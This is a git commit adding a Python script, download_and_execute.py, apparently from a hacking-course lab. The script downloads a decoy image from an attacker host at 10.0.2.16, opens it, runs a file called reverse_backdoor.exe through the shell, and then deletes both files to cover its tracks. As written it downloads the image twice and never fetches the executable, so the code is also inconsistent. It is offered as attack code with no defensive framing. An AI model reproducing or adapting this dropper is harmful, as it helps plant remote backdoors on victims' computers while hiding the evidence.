ea9f0367787ef670e6be7cce8ff587832ab811de
sling254 <mwanikidenis7@gmail.com>
2020-04-13 06:30:19 -0400

    Initial commit

---
+++ download_and_execute.py
@@ -0,0 +1,26 @@
+#!/usr/bin/env python
+
+import requests
+import os, tempfile
+import subprocess
+
+
+def download(url):
+    get_response = requests.get(url)
+    # method to access elements in a string
+    file_name = url.split("/")[-1]
+    with open(file_name, "wb")as out_file:
+        out_file.write(get_response.content)
+
+
+temp_directory = tempfile.gettempdir()
+os.chdir(temp_directory)
+
+download("http://10.0.2.16/evil-files/car.jpg")
+subprocess.Popen("car.jpg", shell=True)
+
+download("http://10.0.2.16/evil-files/car.jpg")
+subprocess.call("reverse_backdoor.exe", shell=True)
+
+os.remove("car.jpg")
+os.remove("reverse_backdoor.exe")
